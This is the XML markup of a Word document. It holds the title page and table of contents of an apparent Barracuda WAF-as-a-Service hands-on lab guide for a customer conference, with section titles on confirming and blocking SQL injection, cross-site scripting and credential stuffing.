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commentsExtensible.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.commentsExtensible+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99217" w14:textId="15C3319A" w:rsidR="008567D8" w:rsidRDefault="7F698058" w:rsidP="00172641">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="44435BD5" wp14:editId="6A17B3B2">
            <wp:extent cx="1721644" cy="471796"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1052260985" name="Picture 105226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2609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1644" cy="471796"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66DF0CE1" w14:textId="77777777" w:rsidR="008D6465" w:rsidRDefault="70401691" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="147A20E3" w14:textId="4A070D6A" w:rsidR="008567D8" w:rsidRPr="002D2B05" w:rsidRDefault="00802A7C" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:rPr>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D2B05">
        <w:rPr>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
        </w:rPr>
        <w:t xml:space="preserve">Barracuda </w:t>
      </w:r>
      <w:r w:rsidR="243BD87F" w:rsidRPr="002D2B05">
        <w:rPr>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
        </w:rPr>
        <w:t xml:space="preserve">WAF-as-a-Service </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D1C2FB" w14:textId="1950DF93" w:rsidR="00D7043B" w:rsidRPr="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="52"/>
          <w:szCs w:val="52"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D2B05">
        <w:rPr>
          <w:sz w:val="52"/>
          <w:szCs w:val="52"/>
        </w:rPr>
        <w:t>Secured21</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="52"/>
          <w:szCs w:val="52"/>
        </w:rPr>
        <w:t xml:space="preserve"> Customer Conference</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A2BB0D0" w14:textId="2ECAE6A6" w:rsidR="59C4101A" w:rsidRDefault="59C4101A" w:rsidP="00172641"/>
    <w:p w14:paraId="550D1C3D" w14:textId="040D8DD4" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="1706A7C1" w14:textId="755E5141" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="3E602905" w14:textId="0A1268C8" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="7F4A6A76" w14:textId="64E33EB4" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="7CE979BF" w14:textId="23F085FB" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="5D50AFBF" w14:textId="7B7309C0" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="074A0304" w14:textId="3D625219" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="7FF451E9" w14:textId="5AF746C3" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="5B628F10" w14:textId="6F174C0D" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="6BCD767F" w14:textId="4447D601" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="12E9C58C" w14:textId="2D4C55E4" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="6487D0FC" w14:textId="4969467D" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="66C1F54F" w14:textId="39ECD7FA" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="4E266A76" w14:textId="32CF0623" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="4B2B3B50" w14:textId="548F5AA8" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="1A95BCC5" w14:textId="7D778DF5" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="6E8DD947" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRPr="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="1291E730" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRPr="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05"/>
    <w:p w14:paraId="22244FCE" w14:textId="53213128" w:rsidR="00F46E0E" w:rsidRDefault="55E0BB2E">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText>TOC \o \z \u \h</w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:hyperlink w:anchor="_Toc72791960" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Introduction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_Toc72791960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4</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="661656FE" w14:textId="2B2EDBC5" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791961" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Check your email for important information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_Toc72791961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4</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="02144138" w14:textId="18791ED9" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791962" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>WAF-as-a-Service Concepts for this Test Drive</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_Toc72791962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5</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5E16A6E2" w14:textId="680B11D8" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791963" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Getting Started</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_Toc72791963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6</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="260D0605" w14:textId="1AD36016" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791964" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Browse to your Backend Server</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_Toc72791964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6</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5CACB718" w14:textId="0142CB57" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791965" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Log in to Barracuda WAF-as-a-Service</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_Toc72791965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6</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="68F90648" w14:textId="71776505" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791966" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Add your Application to WAF-as-a-Service</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_Toc72791966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6</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3472EDF2" w14:textId="06777B92" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791967" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Test your WAF-as-a-Service Application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_Toc72791967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9</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="381F2512" w14:textId="26A230F7" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791968" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Configuring the Application Security Policy</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_Toc72791968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10</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1DDDFA4F" w14:textId="69FDAB96" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791969" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Default Security Posture</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_Toc72791969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10</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="45E5B347" w14:textId="616A5327" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK \l "_Toc72791981" </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="00422614">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:noProof/>
        </w:rPr>
        <w:t>Bot Protection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="000C08D8" w:rsidRPr="000C08D8">
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="181B7559" w14:textId="10E3EF54" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791982" w:history="1">
        <w:r w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Web Scraping Attack Prevention</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="000C08D8" w:rsidRPr="000C08D8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:t>11</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7071A6E7" w14:textId="160A6446" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791983" w:history="1">
        <w:r w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Testing for Credential Stuffing Vulnerabilities</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="000C08D8" w:rsidRPr="000C08D8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:t>13</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="43AC7F65" w14:textId="3B019FD6" w:rsidR="002D2B05" w:rsidRPr="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791984" w:history="1">
        <w:r w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Blocking Credential Stuffing</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="000C08D8" w:rsidRPr="000C08D8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:t>13</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="67D86936" w14:textId="2E5A27CF" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">OWASP # 1 </w:t>
      </w:r>
      <w:hyperlink w:anchor="_Toc72791970" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Confirming the existence of a SQL Injection Vulnerability</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="000C08D8" w:rsidRPr="000C08D8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:t>14</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="74492584" w14:textId="44E2C65A" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791971" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Blocking a SQL Injection Vulnerability</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="000C08D8" w:rsidRPr="000C08D8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:t>16</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="35311E2F" w14:textId="11AC5099" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">OWASP # 3 </w:t>
      </w:r>
      <w:hyperlink w:anchor="_Toc72791972" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Blocking Cross-Site Scripting (also known as XSS)</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="000C08D8" w:rsidRPr="000C08D8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:t>17</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="385FB3D6" w14:textId="66AF5B61" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791973" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Confirming a Cross-Site Scripting vulnerability</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="000C08D8" w:rsidRPr="000C08D8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:t>18</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4A82EC83" w14:textId="7486E75A" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791974" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Venturing beyond the OWASP Top 10</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="000C08D8" w:rsidRPr="000C08D8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:t>19</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1BB83A47" w14:textId="37FFBC5B" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791975" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Geolocation</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="000C08D8" w:rsidRPr="000C08D8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:t>19</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="05A083B9" w14:textId="3A6D1D50" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791976" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Allow Trusted Clients</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="000C08D8" w:rsidRPr="000C08D8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:t>20</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="50A6C9AC" w14:textId="1DBBF481" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791979" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
